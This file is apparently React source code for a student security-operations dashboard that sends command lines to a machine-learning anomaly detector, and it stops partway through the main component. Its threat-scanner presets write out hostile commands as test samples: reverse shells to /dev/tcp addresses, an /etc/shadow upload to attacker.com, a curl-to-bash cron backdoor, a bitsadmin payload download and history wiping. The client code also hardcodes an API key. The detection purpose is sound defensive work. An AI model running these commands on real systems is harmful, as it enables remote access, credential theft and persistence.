'use client';

import { useEffect, useState, useMemo, useCallback } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  LineChart, Line, XAxis, YAxis, CartesianGrid,
  Tooltip, ResponsiveContainer, AreaChart, Area
} from 'recharts';
import {
  ShieldAlert, ShieldCheck, Activity, Terminal,
  User, Search, X, Cpu, AlertTriangle, Info, TrendingUp,
  RefreshCw, Zap, Database, Lock, Globe, Server,
  ScanLine, Send, Monitor, Apple, Wifi, Copy, Check
} from 'lucide-react';

// --- Types ---
interface SOCEvent {
  id: number;
  process_name: string;
  command_line: string;
  user: string;
  severity: string;
  anomaly_score: number;
  mitre_technique?: string;
}

// --- Components ---

// ─── Live Device Scanner ──────────────────────────────────────────────────────
const parseBrowser = (ua: string) => {
  if (/Edg\//.test(ua))     return { name: 'Microsoft Edge',  icon: '🔵' };
  if (/OPR\//.test(ua))     return { name: 'Opera',           icon: '🔴' };
  if (/Chrome\//.test(ua))  return { name: 'Google Chrome',   icon: '🟡' };
  if (/Firefox\//.test(ua)) return { name: 'Mozilla Firefox', icon: '🦊' };
  if (/Safari\//.test(ua))  return { name: 'Apple Safari',    icon: '🔵' };
  return { name: 'Unknown Browser', icon: '🌐' };
};
const parseOS = (ua: string, platform: string) => {
  if (/iPhone|iPad/.test(ua))  return { name: 'iOS',     icon: '📱' };
  if (/Android/.test(ua))      return { name: 'Android', icon: '🤖' };
  if (/Windows/.test(ua))      return { name: 'Windows', icon: '🪟' };
  if (/Mac OS X/.test(ua))     return { name: 'macOS',   icon: '🍎' };
  if (/Linux/.test(ua))        return { name: 'Linux',   icon: '🐧' };
  return { name: platform || 'Unknown', icon: '💻' };
};

const SEV_STYLES_MAP: Record<string, { bg: string; text: string; border: string }> = {
  critical: { bg: 'bg-red-500/20',     text: 'text-red-400',     border: 'border-red-500/50'     },
  high:     { bg: 'bg-orange-500/20',  text: 'text-orange-400',  border: 'border-orange-500/50'  },
  medium:   { bg: 'bg-yellow-500/20',  text: 'text-yellow-400',  border: 'border-yellow-500/50'  },
  low:      { bg: 'bg-blue-500/20',    text: 'text-blue-400',    border: 'border-blue-500/50'    },
  normal:   { bg: 'bg-emerald-500/20', text: 'text-emerald-400', border: 'border-emerald-500/50' },
};
const SEV_ICONS_MAP: Record<string, string> = { critical:'🔴', high:'🟠', medium:'🟡', low:'🔵', normal:'🟢' };

const LiveDeviceScanner = ({ onScanComplete }: { onScanComplete?: () => void }) => {
  const [scanning, setScanning] = useState(false);
  const [result,   setResult]   = useState<any>(null);
  const [profile,  setProfile]  = useState<any>(null);

  const scan = async () => {
    setScanning(true);
    setResult(null);
    const ua      = navigator.userAgent;
    const plat    = navigator.platform || '';
    const browser = parseBrowser(ua);
    const os      = parseOS(ua, plat);
    const tz      = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const lang    = navigator.language;
    const cores   = navigator.hardwareConcurrency ?? '?';
    const mem     = (navigator as any).deviceMemory ?? '?';
    const conn    = (navigator as any).connection?.effectiveType ?? 'unknown';
    const screenR = `${screen.width}x${screen.height}`;
    setProfile({ browser, os, tz, lang, cores, mem, conn, screenR });

    const processName = browser.name;
    const commandLine = [
      `browser=${browser.name}`, `os=${os.name}`,
      `ua=${ua.slice(0, 180)}`, `timezone=${tz}`,
      `lang=${lang}`, `screen=${screenR}`,
      `cpu_cores=${cores}`, `ram=${mem}GB`, `network=${conn}`,
    ].join(' | ');
    const user = `visitor@${os.name.replace(/\s/g, '-')}`;

    try {
      const res = await fetch('/api/ingest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-API-Key': 'soc_diploma_secret_2026' },
        body: JSON.stringify({ process_name: processName, command_line: commandLine, user }),
      });
      setResult(await res.json());
      onScanComplete?.();
    } catch { setResult({ error: true }); }
    setScanning(false);
  };

  const sev   = result?.severity ?? 'normal';
  const style = SEV_STYLES_MAP[sev] ?? SEV_STYLES_MAP.normal;

  return (
    <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}
      className="glass rounded-[2.5rem] p-8 border-white/5 relative overflow-hidden"
    >
      <div className="absolute -top-24 -left-24 w-72 h-72 bg-blue-500/5 rounded-full blur-3xl pointer-events-none" />
      <div className="flex flex-col lg:flex-row gap-8">

        {/* Left — CTA */}
        <div className="lg:w-80 flex-shrink-0 flex flex-col justify-between gap-6">
          <div>
            <div className="flex items-center gap-3 mb-4">
              <div className="p-3 bg-blue-500/10 rounded-2xl border border-blue-500/20">
                <Monitor size={22} className="text-blue-400" />
              </div>
              <div>
                <h2 className="text-xl font-black text-white uppercase tracking-tighter">Live Device Scan</h2>
                <p className="text-[10px] text-slate-500 font-mono tracking-widest">REAL DATA · ANY DEVICE · ONE CLICK</p>
              </div>
            </div>
            <p className="text-slate-400 text-sm leading-relaxed">
              One click — your browser sends <span className="text-white font-semibold">real</span> device info (OS, browser, hardware, timezone, network) to the ML model for live threat analysis.
            </p>
            <ul className="mt-4 space-y-2 text-[11px] text-slate-600">
              {['No install. No manual input.','Works on phone, tablet, laptop','Results visible to all visitors','Isolation Forest ML + MITRE ATT&CK'].map(t => (
                <li key={t} className="flex items-center gap-2"><Check size={11} className="text-emerald-500 flex-shrink-0" />{t}</li>
              ))}
            </ul>
          </div>
          <motion.button whileHover={{ scale: 1.03 }} whileTap={{ scale: 0.97 }} onClick={scan} disabled={scanning}
            className={`w-full py-5 rounded-2xl text-sm font-black uppercase tracking-widest border transition-all flex items-center justify-center gap-3 ${
              scanning ? 'opacity-50 cursor-not-allowed border-white/5 text-slate-600'
                       : 'border-blue-500/50 bg-blue-500/10 text-blue-400 hover:bg-blue-500/20 hover:border-blue-400'
            }`}
          >
            {scanning ? <><RefreshCw size={18} className="animate-spin" />Scanning...</> : <><Activity size={18} />Scan My Device</>}
          </motion.button>
        </div>

        {/* Right — Result */}
        <div className="flex-1">
          <AnimatePresence mode="wait">
            {!scanning && !result && (
              <motion.div key="idle" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
                className="h-full flex flex-col justify-center gap-3"
              >
                <p className="text-[9px] text-slate-700 uppercase tracking-widest font-bold">Data that will be collected from your device</p>
                <div className="grid grid-cols-2 gap-2">
                  {[
                    { label: 'Browser',  value: parseBrowser(typeof navigator !== 'undefined' ? navigator.userAgent : '').name },
                    { label: 'OS',       value: parseOS(typeof navigator !== 'undefined' ? navigator.userAgent : '', '').name },
                    { label: 'Timezone', value: typeof Intl !== 'undefined' ? Intl.DateTimeFormat().resolvedOptions().timeZone : '—' },
                    { label: 'Language', value: typeof navigator !== 'undefined' ? navigator.language : '—' },
                    { label: 'CPU Cores',value: typeof navigator !== 'undefined' ? String(navigator.hardwareConcurrency ?? '?') : '—' },
                    { label: 'Screen',   value: typeof screen !== 'undefined' ? `${screen.width}×${screen.height}` : '—' },
                  ].map(({ label, value }) => (
                    <div key={label} className="bg-black/40 rounded-xl px-4 py-3 border border-white/5">
                      <p className="text-[9px] text-slate-600 uppercase tracking-widest font-bold">{label}</p>
                      <p className="text-sm text-slate-300 font-mono mt-0.5 truncate">{value}</p>
                    </div>
                  ))}
                </div>
                <p className="text-[10px] text-slate-700 text-center font-mono mt-1">↑ Real data → Real ML → Real result</p>
              </motion.div>
            )}
            {scanning && (
              <motion.div key="scan" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
                className="h-full flex flex-col items-center justify-center gap-6"
              >
                <div className="relative w-28 h-28">
                  <span className="absolute inset-0 rounded-full border-2 border-blue-500/30 animate-ping" />
                  <span className="absolute inset-4 rounded-full border-2 border-blue-500/20 animate-ping" style={{ animationDelay: '0.3s' }} />
                  <div className="absolute inset-0 flex items-center justify-center"><Monitor size={40} className="text-blue-400" /></div>
                </div>
                <div className="text-center">
                  <p className="text-blue-400 font-mono text-sm tracking-widest uppercase">Analyzing your device...</p>
                  <p className="text-slate-600 text-[10px] mt-1">Isolation Forest ML · MITRE ATT&CK matching</p>
                </div>
              </motion.div>
            )}
            {result && !scanning && (
              <motion.div key="result" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="space-y-3">
                {result.error ? (
                  <p className="text-red-400 font-mono text-center py-12">❌ Backend unreachable</p>
                ) : (
                  <>
                    <div className={`rounded-2xl p-6 border ${style.bg} ${style.border} text-center`}>
                      <p className="text-[9px] text-slate-400 uppercase tracking-[0.3em] font-bold mb-1">Your Device — Threat Level</p>
                      <p className={`text-5xl font-black uppercase tracking-tighter ${style.text}`}>{SEV_ICONS_MAP[sev]} {sev}</p>
                      <p className={`font-mono text-lg font-bold mt-2 ${style.text} opacity-60`}>ML score: {result.anomaly_score?.toFixed(4)}</p>
                    </div>
                    {profile && (
                      <div className="grid grid-cols-3 gap-2">
                        {[
                          { label: 'Browser', value: `${profile.browser.icon} ${profile.browser.name}` },
                          { label: 'OS',      value: `${profile.os.icon} ${profile.os.name}` },
                          { label: 'Network', value: profile.conn },
                        ].map(({ label, value }) => (
                          <div key={label} className="bg-black/40 rounded-xl px-3 py-2.5 border border-white/5 text-center">
                            <p className="text-[9px] text-slate-600 uppercase tracking-widest">{label}</p>
                            <p className="text-xs text-slate-300 font-mono mt-0.5 truncate">{value}</p>
                          </div>
                        ))}
                      </div>
                    )}
                    {result.mitre_technique ? (
                      <div className="bg-indigo-500/5 border border-indigo-500/20 rounded-xl p-4">
                        <p className="text-[9px] text-indigo-400 font-bold uppercase tracking-widest mb-1">MITRE ATT&CK Match</p>
                        <p className="text-xs text-indigo-300 font-mono">{result.mitre_technique}</p>
                      </div>
                    ) : (
                      <div className="flex items-center gap-3 px-4 py-3 bg-emerald-500/5 border border-emerald-500/20 rounded-xl">
                        <ShieldCheck size={16} className="text-emerald-400 flex-shrink-0" />
                        <span className="text-xs text-emerald-400 font-bold">No known attack technique — device appears clean</span>
                      </div>
                    )}
                    <div className="flex items-center justify-between px-4 py-2.5 bg-black/40 rounded-xl border border-white/5">
                      <span className="text-[10px] text-slate-600 uppercase tracking-widest">Logged as event #{result.id}</span>
                      <motion.button whileTap={{ scale: 0.97 }} onClick={scan}
                        className="text-[10px] text-slate-600 hover:text-slate-300 font-bold uppercase tracking-widest transition-colors"
                      >↺ Scan again</motion.button>
                    </div>
                  </>
                )}
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>
    </motion.div>
  );
};



const StatCard = ({ title, value, icon: Icon, color, alert, delay = 0 }: any) => {
  const colors: any = {
    blue: "from-blue-600/10 to-blue-400/5 border-blue-500/20 text-blue-400 shadow-blue-500/5",
    red: "from-red-600/10 to-red-400/5 border-red-500/20 text-red-400 shadow-red-500/5",
    emerald: "from-emerald-600/10 to-emerald-400/5 border-emerald-500/20 text-emerald-400 shadow-emerald-500/5",
    purple: "from-purple-600/10 to-purple-400/5 border-purple-500/20 text-purple-400 shadow-purple-500/5",
  };

  return (
    <motion.div
      whileHover={{ y: -8, scale: 1.02, transition: { duration: 0.2 } }}
      initial={{ opacity: 0, y: 30 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ delay, duration: 0.5, ease: "easeOut" }}
      className={`glass p-8 rounded-[2rem] border bg-gradient-to-br ${colors[color]} relative overflow-hidden group`}
    >
      <div className="flex justify-between items-start mb-4 relative z-10">
        <div className={`p-3 rounded-2xl bg-black/40 border border-white/5 group-hover:rotate-6 transition-transform`}>
          <Icon size={24} />
        </div>
        {alert && (
          <div className="flex h-3 w-3 relative">
            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
            <span className="relative inline-flex rounded-full h-3 w-3 bg-red-500"></span>
          </div>
        )}
      </div>
      <div className="relative z-10">
        <p className="text-slate-400 text-[10px] font-bold uppercase tracking-[0.2em] mb-1">{title}</p>
        <p className="text-3xl font-black text-white tracking-tighter">{value}</p>
      </div>
      {/* Decorative element */}
      <div className="absolute -right-4 -bottom-4 opacity-5 group-hover:opacity-10 transition-opacity">
        <Icon size={120} />
      </div>
    </motion.div>
  );
};

// --- Threat Scanner ---

const PLATFORM_PRESETS: Record<string, { label: string; icon: any; color: string; examples: Array<{ proc: string; cmd: string; user: string; label: string }> }> = {
  windows: {
    label: 'Windows',
    icon: Monitor,
    color: 'blue',
    examples: [
      { proc: 'powershell.exe', cmd: 'powershell.exe -EncodedCommand JABjAD0AbgBlAHcALQBvAGIAagBlAGMAdAA=', user: 'alice', label: 'PS Obfuscation' },
      { proc: 'cmd.exe',        cmd: 'whoami /all & net user & ipconfig /all', user: 'bob', label: 'Recon Chain' },
      { proc: 'bitsadmin.exe',  cmd: 'bitsadmin /transfer job /download http://evil.ru/payload.exe C:\\temp\\p.exe', user: 'system', label: 'BITS Download' },
      { proc: 'chrome.exe',     cmd: 'chrome.exe --type=renderer --no-sandbox', user: 'alice', label: 'Normal Browser' },
    ],
  },
  linux: {
    label: 'Linux',
    icon: Server,
    color: 'emerald',
    examples: [
      { proc: 'bash', cmd: 'bash -i >& /dev/tcp/185.220.101.45/4444 0>&1', user: 'www-data', label: 'Reverse Shell' },
      { proc: 'bash', cmd: 'cat /etc/shadow > /tmp/.s && curl -F file=@/tmp/.s http://attacker.com', user: 'root', label: 'Shadow Dump' },
      { proc: 'bash', cmd: 'crontab -l | { cat; echo "* * * * * curl http://10.0.0.1/bd.sh|bash"; }|crontab -', user: 'www-data', label: 'Cron Persistence' },
      { proc: 'nginx', cmd: 'nginx: worker process', user: 'www-data', label: 'Normal Nginx' },
    ],
  },
  macos: {
    label: 'macOS',
    icon: Apple,
    color: 'purple',
    examples: [
      { proc: 'zsh',  cmd: 'zsh -i >& /dev/tcp/185.100.87.50/4444 0>&1', user: 'charlie', label: 'Reverse Shell' },
      { proc: 'bash', cmd: 'launchctl load ~/Library/LaunchAgents/com.apple.update.helper.plist', user: 'charlie', label: 'Launch Agent' },
      { proc: 'bash', cmd: 'history -c; unset HISTFILE; rm -f ~/.zsh_history', user: 'charlie', label: 'Clear History' },
      { proc: 'Finder', cmd: '/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder', user: 'charlie', label: 'Normal Finder' },
    ],
  },
};

const SEV_STYLES: Record<string, { bg: string; text: string; border: string; glow: string }> = {
  critical: { bg: 'bg-red-500/20',     text: 'text-red-400',     border: 'border-red-500/50',     glow: 'shadow-red-500/20' },
  high:     { bg: 'bg-orange-500/20',  text: 'text-orange-400',  border: 'border-orange-500/50',  glow: 'shadow-orange-500/20' },
  medium:   { bg: 'bg-yellow-500/20',  text: 'text-yellow-400',  border: 'border-yellow-500/50',  glow: 'shadow-yellow-500/20' },
  low:      { bg: 'bg-blue-500/20',    text: 'text-blue-400',    border: 'border-blue-500/50',    glow: 'shadow-blue-500/20' },
  normal:   { bg: 'bg-emerald-500/20', text: 'text-emerald-400', border: 'border-emerald-500/50', glow: 'shadow-emerald-500/20' },
};

const ThreatScanner = () => {
  const [platform, setPlatform] = useState<'windows'|'linux'|'macos'|'custom'>('windows');
  const [activeIdx, setActiveIdx] = useState<number | null>(null);
  const [result, setResult] = useState<any>(null);
  const [scanning, setScanning] = useState(false);

  // Custom input state
  const [customProc, setCustomProc] = useState('');
  const [customCmd,  setCustomCmd]  = useState('');
  const [customUser, setCustomUser] = useState('visitor');

  // One click → instant scan (preset)
  const scanPreset = async (ex: { proc: string; cmd: string; user: string }, idx: number) => {
    setActiveIdx(idx);
    setScanning(true);
    setResult(null);
    try {
      const res = await fetch('/api/ingest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-API-Key': 'soc_diploma_secret_2026' },
        body: JSON.stringify({ process_name: ex.proc, command_line: ex.cmd, user: ex.user }),
      });
      setResult(await res.json());
    } catch { setResult({ error: true }); }
    setScanning(false);
  };

  // Custom input scan
  const scanCustom = async () => {
    if (!customProc.trim() || !customCmd.trim()) return;
    setScanning(true);
    setResult(null);
    try {
      const res = await fetch('/api/ingest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-API-Key': 'soc_diploma_secret_2026' },
        body: JSON.stringify({ process_name: customProc.trim(), command_line: customCmd.trim(), user: customUser.trim() || 'visitor' }),
      });
      setResult(await res.json());
    } catch { setResult({ error: true }); }
    setScanning(false);
  };

  const changePlatform = (key: 'windows'|'linux'|'macos'|'custom') => {
    setPlatform(key); setActiveIdx(null); setResult(null);
  };

  const p = PLATFORM_PRESETS[platform];
  const sevStyle = result && !result.error ? (SEV_STYLES[result.severity] || SEV_STYLES.normal) : null;
  const SEV_ICONS: Record<string, string> = { critical: '🔴', high: '🟠', medium: '🟡', low: '🔵', normal: '🟢' };

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ delay: 0.3 }}
      className="glass rounded-[2.5rem] p-8 border-white/5"
    >
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 mb-8">
        <div className="flex items-center gap-4">
          <div className="p-3 bg-cyan-500/10 rounded-2xl border border-cyan-500/20">
            <ScanLine size={22} className="text-cyan-400" />
          </div>
          <div>
            <h2 className="text-xl font-black text-white uppercase tracking-tighter">Threat Scanner</h2>
            <p className="text-[10px] text-slate-500 font-mono tracking-widest mt-0.5">CLICK ANY SCENARIO OR TYPE YOUR OWN COMMAND TO ANALYZE</p>
          </div>
        </div>
        {/* Platform Tabs */}
        <div className="flex gap-2 flex-wrap">
          {(Object.keys(PLATFORM_PRESETS) as Array<'windows'|'linux'|'macos'>).map(key => {
            const pl = PLATFORM_PRESETS[key];
            const active = platform === key;
            const colors: any = {
              windows: 'border-blue-500 bg-blue-500/10 text-blue-400',
              linux:   'border-emerald-500 bg-emerald-500/10 text-emerald-400',
              macos:   'border-purple-500 bg-purple-500/10 text-purple-400',
            };
            return (
              <button key={key} onClick={() => changePlatform(key)}
                className={`flex items-center gap-2 px-4 py-2 rounded-xl text-[10px] font-black uppercase tracking-widest border transition-all ${
                  active ? colors[key] : 'border-white/5 text-slate-500 hover:border-white/20 hover:text-slate-300'
                }`}
              >
                <pl.icon size={12} /> {pl.label}
              </button>
            );
          })}
          {/* Custom tab */}
          <button onClick={() => changePlatform('custom')}
            className={`flex items-center gap-2 px-4 py-2 rounded-xl text-[10px] font-black uppercase tracking-widest border transition-all ${
              platform === 'custom'
                ? 'border-cyan-500 bg-cyan-500/10 text-cyan-400'
                : 'border-white/5 text-slate-500 hover:border-white/20 hover:text-slate-300'
            }`}
          >
            <Send size={12} /> Custom
          </button>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {platform === 'custom' ? (
          /* ── Custom Input Panel ── */
          <div className="space-y-4">
            <p className="text-[9px] text-slate-600 font-bold uppercase tracking-widest">✏️ Enter any command to test the ML model</p>
            <div className="space-y-3">
              <div>
                <label className="text-[9px] text-slate-500 uppercase tracking-widest font-bold block mb-1.5">Process Name</label>
                <input
                  value={customProc}
                  onChange={e => setCustomProc(e.target.value)}
                  placeholder="e.g. powershell.exe"
                  className="w-full bg-black/50 border border-white/10 focus:border-cyan-500/50 rounded-xl px-4 py-3 text-sm text-white font-mono placeholder-slate-700 outline-none transition-colors"
                />
              </div>
              <div>
                <label className="text-[9px] text-slate-500 uppercase tracking-widest font-bold block mb-1.5">Command Line</label>
                <textarea
                  value={customCmd}
                  onChange={e => setCustomCmd(e.target.value)}
                  placeholder="e.g. bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
                  rows={3}
                  className="w-full bg-black/50 border border-white/10 focus:border-cyan-500/50 rounded-xl px-4 py-3 text-sm text-white font-mono placeholder-slate-700 outline-none transition-colors resize-none"
                />
              </div>
              <div>
                <label className="text-[9px] text-slate-500 uppercase tracking-widest font-bold block mb-1.5">Username</label>
                <input
                  value={customUser}
                  onChange={e => setCustomUser(e.target.value)}
                  placeholder="visitor"
                  className="w-full bg-black/50 border border-white/10 focus:border-cyan-500/50 rounded-xl px-4 py-3 text-sm text-white font-mono placeholder-slate-700 outline-none transition-colors"
                />
              </div>
              <motion.button
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
                onClick={scanCustom}
                disabled={scanning || !customProc.trim() || !customCmd.trim()}
                className="w-full py-4 rounded-2xl text-[11px] font-black uppercase tracking-widest border transition-all flex items-center justify-center gap-2
                  border-cyan-500/50 bg-cyan-500/10 text-cyan-400 hover:bg-cyan-500/20
                  disabled:opacity-40 disabled:cursor-not-allowed"
              >
                {scanning ? <><RefreshCw size={14} className="animate-spin" /> Analyzing...</> : <><Send size={14} /> Analyze Command</>}
              </motion.button>
            </div>
          </div>
        ) : (
          /* ── Preset Attack Cards ── */
          <div className="space-y-3">
            <p className="text-[9px] text-slate-600 font-bold uppercase tracking-widest mb-3">
              👆 Click any scenario to analyze
            </p>
          {p.examples.map((ex, i) => {
            const isActive = activeIdx === i;
            const isScanning = isActive && scanning;
            return (
              <motion.button
                key={i}
                whileHover={{ scale: 1.01, x: 4 }}
                whileTap={{ scale: 0.99 }}
                onClick={() => scanPreset(ex, i)}
                disabled={scanning}
                className={`w-full text-left p-5 rounded-2xl border transition-all group relative overflow-hidden ${
                  isActive
                    ? 'border-cyan-500/50 bg-cyan-500/5'
                    : 'border-white/5 bg-white/[0.02] hover:border-white/20 hover:bg-white/[0.04]'
                } ${scanning && !isActive ? 'opacity-40' : ''}`}
              >
                {/* Scanning shimmer */}
                {isScanning && (
                  <motion.div
                    animate={{ x: ['-100%', '200%'] }}
                    transition={{ duration: 1.2, repeat: Infinity, ease: 'linear' }}
                    className="absolute inset-0 bg-gradient-to-r from-transparent via-cyan-500/10 to-transparent"
                  />
                )}
                <div className="flex items-start justify-between gap-3 relative z-10">
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2 mb-1.5">
                      <span className={`text-[10px] font-black uppercase tracking-widest ${isActive ? 'text-cyan-400' : 'text-slate-400 group-hover:text-slate-200'}`}>
                        {ex.label}
                      </span>
                    </div>
                    <div className="font-mono text-[10px] text-slate-500 truncate">{ex.proc}</div>
                    <div className="font-mono text-[9px] text-slate-700 truncate mt-0.5">{ex.cmd.slice(0, 70)}{ex.cmd.length > 70 ? '…' : ''}</div>
                  </div>
                  <div className="flex-shrink-0">
                    {isScanning ? (
                      <RefreshCw size={16} className="text-cyan-400 animate-spin" />
                    ) : (
                      <Send size={14} className={`transition-colors ${isActive ? 'text-cyan-400' : 'text-slate-700 group-hover:text-slate-400'}`} />
                    )}
                  </div>
                </div>
              </motion.button>
            );
          })}
          </div>
        )}

        {/* Right: Result Panel */}
        <div className="flex items-center justify-center min-h-[280px]">
          <AnimatePresence mode="wait">
            {!result && !scanning && (
              <motion.div key="empty" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
                className="text-center space-y-4 px-8"
              >
                <div className="w-20 h-20 rounded-full bg-white/[0.03] border border-white/5 flex items-center justify-center mx-auto">
                  <ScanLine size={32} className="text-slate-700" />
                </div>
                <div>
                  <p className="text-slate-500 text-sm font-semibold">Click any scenario</p>
                  <p className="text-slate-700 text-xs mt-1">Instant threat analysis across Windows, Linux & macOS</p>
                </div>
              </motion.div>
            )}
            {scanning && (
              <motion.div key="scanning" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
                className="text-center space-y-5"
              >
                <div className="relative w-24 h-24 mx-auto">
                  <div className="absolute inset-0 rounded-full border-2 border-cyan-500/20 animate-ping" />
                  <div className="absolute inset-2 rounded-full border-2 border-cyan-500/30" />
                  <div className="absolute inset-0 flex items-center justify-center">
                    <RefreshCw size={32} className="text-cyan-400 animate-spin" />
                  </div>
                </div>
                <div>
                  <p className="text-cyan-400 text-sm font-mono tracking-widest uppercase">Analyzing...</p>
                  <p className="text-slate-600 text-[10px] mt-1">ML model + MITRE ATT&CK matching</p>
                </div>
              </motion.div>
            )}
            {result && !scanning && (
              <motion.div key="result" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0 }}
                className="w-full space-y-3"
              >
                {result.error ? (
                  <div className="text-center py-8">
                    <p className="text-red-400 font-mono text-sm">❌ Backend unreachable</p>
                  </div>
                ) : (
                  <>
                    {/* Big severity banner */}
                    <div className={`rounded-2xl p-6 border ${sevStyle!.bg} ${sevStyle!.border} shadow-2xl text-center`}>
                      <p className="text-[9px] font-bold uppercase tracking-[0.3em] text-slate-400 mb-1">Threat Level</p>
                      <p className={`text-6xl font-black uppercase tracking-tighter ${sevStyle!.text}`}>
                        {SEV_ICONS[result.severity]} {result.severity}
                      </p>
                      <p className={`font-mono text-xl font-bold mt-2 ${sevStyle!.text} opacity-60`}>
                        score: {result.anomaly_score?.toFixed(4)}
                      </p>
                    </div>

                    {/* MITRE */}
                    {result.mitre_technique ? (
                      <div className="bg-indigo-500/5 border border-indigo-500/20 rounded-2xl p-4">
                        <p className="text-[9px] text-indigo-400 font-bold uppercase tracking-widest mb-1.5">MITRE ATT&CK Detected</p>
                        <p className="text-xs text-indigo-300 font-mono leading-relaxed">{result.mitre_technique}</p>
                      </div>
                    ) : (
                      <div className="flex items-center gap-3 px-4 py-3 bg-emerald-500/5 border border-emerald-500/20 rounded-xl">
                        <ShieldCheck size={16} className="text-emerald-400 flex-shrink-0" />
                        <span className="text-xs text-emerald-400 font-bold">No known attack technique — activity appears benign</span>
                      </div>
                    )}

                    <div className="flex items-center justify-between px-4 py-2.5 bg-black/40 rounded-xl border border-white/5">
                      <span className="text-[10px] text-slate-600 uppercase tracking-widest">Logged as event</span>
                      <span className="text-xs font-mono text-slate-400">#{result.id}</span>
                    </div>
                  </>
                )}
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>
    </motion.div>
  );
};

// --- Agent Connect Card ---
const AgentConnectCard = () => {
  const [copied, setCopied] = useState<number|null>(null);

  // backendUrl is auto-detected:
  // - On hosted site: uses NEXT_PUBLIC_BACKEND_URL env var
  // - On localhost: falls back to same hostname on port 8000
  const backendUrl = typeof window !== 'undefined'
    ? (process.env.NEXT_PUBLIC_BACKEND_URL || `http://${window.location.hostname}:8000`)
    : '';

  const steps = [
    { n: 1, label: 'Download agent', cmd: `curl ${backendUrl}/download/agent -o agent.py` },
    { n: 2, label: 'Install dependency', cmd: `pip install psutil` },
    { n: 3, label: 'Run & send your processes', cmd: `SOC_BACKEND_URL=${backendUrl} python3 agent.py` },
  ];

  const copy = (text: string, i: number) => {
    navigator.clipboard.writeText(text);
    setCopied(i);
    setTimeout(() => setCopied(null), 2000);
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ delay: 0.35 }}
      className="glass rounded-[2.5rem] p-8 border-white/5 relative overflow-hidden"
    >
      {/* Accent glow */}
      <div className="absolute -top-20 -right-20 w-64 h-64 bg-emerald-500/5 rounded-full blur-3xl pointer-events-none" />

      <div className="flex flex-col lg:flex-row gap-8 items-start">
        {/* Left: heading */}
        <div className="lg:w-72 flex-shrink-0">
          <div className="flex items-center gap-3 mb-3">
            <div className="p-3 bg-emerald-500/10 rounded-2xl border border-emerald-500/20">
              <Activity size={22} className="text-emerald-400" />
            </div>
            <div>
              <h2 className="text-xl font-black text-white uppercase tracking-tighter">Real Device Agent</h2>
              <p className="text-[10px] text-slate-500 font-mono tracking-widest">SEND YOUR OWN PROCESSES</p>
            </div>
          </div>
          <p className="text-slate-400 text-sm leading-relaxed">
            Run 3 commands on any <span className="text-white font-bold">Mac · Linux · Windows</span> machine.
            Your real processes will appear on this dashboard, analyzed by the ML model in real time.
          </p>
          <div className="mt-4 flex items-center gap-2 text-[10px] text-slate-600">
            <span className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
            Requires Python 3 on your device
          </div>
        </div>

        {/* Right: steps */}
        <div className="flex-1 space-y-3">
          {steps.map((s, i) => (
            <div key={i} className="flex items-center gap-4 group">
              <span className="text-[10px] font-black text-slate-700 w-4 flex-shrink-0 group-hover:text-emerald-500 transition-colors">{s.n}</span>
              <div className="flex-1 flex items-center gap-3 bg-black/50 border border-white/5 hover:border-emerald-500/30 rounded-2xl px-5 py-3.5 transition-all group-hover:bg-black/70">
                <div className="flex-1 min-w-0">
                  <p className="text-[9px] text-slate-600 uppercase tracking-widest font-bold mb-0.5">{s.label}</p>
                  <p className="font-mono text-sm text-emerald-400 truncate">{s.cmd}</p>
                </div>
                <button
                  onClick={() => copy(s.cmd, i)}
                  className="flex-shrink-0 p-2 rounded-xl hover:bg-white/5 text-slate-700 hover:text-white transition-all"
                >
                  {copied === i
                    ? <Check size={14} className="text-emerald-400" />
                    : <Copy size={14} />}
                </button>
              </div>
            </div>
          ))}

          <p className="text-[10px] text-slate-700 font-mono pl-8">
            Results appear on the dashboard above within seconds — visible to all visitors.
          </p>
        </div>
      </div>
    </motion.div>
  );
};

const StatusBadge = ({ severity }: { severity: string }) => {
  const styles: any = {
    critical: "bg-red-500/20 text-red-400 border-red-500/40",
    high: "bg-orange-500/20 text-orange-400 border-orange-500/40",
    medium: "bg-yellow-500/20 text-yellow-400 border-yellow-500/40",
    low: "bg-blue-500/20 text-blue-400 border-blue-500/40",
    normal: "bg-emerald-500/20 text-emerald-400 border-emerald-500/40",
  };

  return (
    <span className={`px-3 py-1 rounded-full text-[9px] font-black uppercase tracking-widest border ${styles[severity] || styles.normal}`}>
      {severity}
    </span>
  );
};

// --- Main Page ---

export default function Dashboard() {
  const [events, setEvents] = useState<SOCEvent[]>([]);
  const [selectedEvent, setSelectedEvent] = useState<SOCEvent | null>(null);
  const [aiReport, setAiReport] = useState<string>("");
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isSimulating, setIsSimulating] = useState(false);
  const [isMounted, setIsMounted] = useState(false);

  useEffect(() => {
    setIsMounted(true);
    fetchEvents();
